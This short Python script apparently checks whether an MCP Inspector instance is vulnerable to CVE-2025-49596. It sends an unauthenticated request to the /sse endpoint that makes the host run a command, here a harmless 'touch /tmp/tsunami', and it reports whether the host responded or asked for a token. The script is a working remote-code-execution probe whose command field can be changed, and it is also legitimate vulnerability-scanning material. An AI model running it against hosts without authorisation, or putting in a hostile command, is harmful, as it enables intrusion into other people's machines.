import requests
import sys

def check_mcp_inspector(host="localhost", port=6277):
    url = f"http://{host}:{port}/sse"
    params = {
        "transportType": "stdio",
        "command": "touch",
        "args": "/tmp/tsunami"
    }

    print(f"[*] Checking {url} for CVE‑2025‑49596...")
    try:
        response = requests.get(url, params=params, timeout=5)
        if response.status_code == 200:
            print("[+] MCP Inspector responded without auth token!")
            print("[!] This host is likely vulnerable to CVE‑2025‑49596.")
            print(f"Response: {response.text[:200]}...")
        elif response.status_code == 401:
            print("[-] Auth token required. Likely patched version (v0.14.1+).")
        else:
            print(f"[-] Unexpected response: {response.status_code}")
    except requests.exceptions.ConnectionError:
        print("[-] Could not connect. MCP Inspector may not be running.")
    except requests.exceptions.Timeout:
        print("[-] Connection timed out.")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    target_host = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    check_mcp_inspector(target_host)

